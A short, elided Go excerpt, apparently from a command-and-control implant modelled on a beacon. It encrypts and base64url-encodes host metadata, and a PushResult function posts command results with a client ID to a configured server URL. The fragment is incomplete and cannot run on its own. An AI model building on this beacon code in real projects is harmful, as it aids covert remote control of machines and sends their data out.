...
func EncryptedMetaInfo() string {
	...
	//使用base64url 编码metadata
	finalPakcet := base64.RawURLEncoding.EncodeToString(packetEncrypted)
	return finalPakcet
}
...
func PushResult(b []byte) *req.Resp {
	// post 的session id默认是放在url 里的，strconv.Itoa(clientID) 就是这个id这里根据profile 进行修改
	// url := config.PostUrl + strconv.Itoa(clientID)
	url := config.PostUrl
	resp := HttpPost(url, strconv.Itoa(clientID), b)
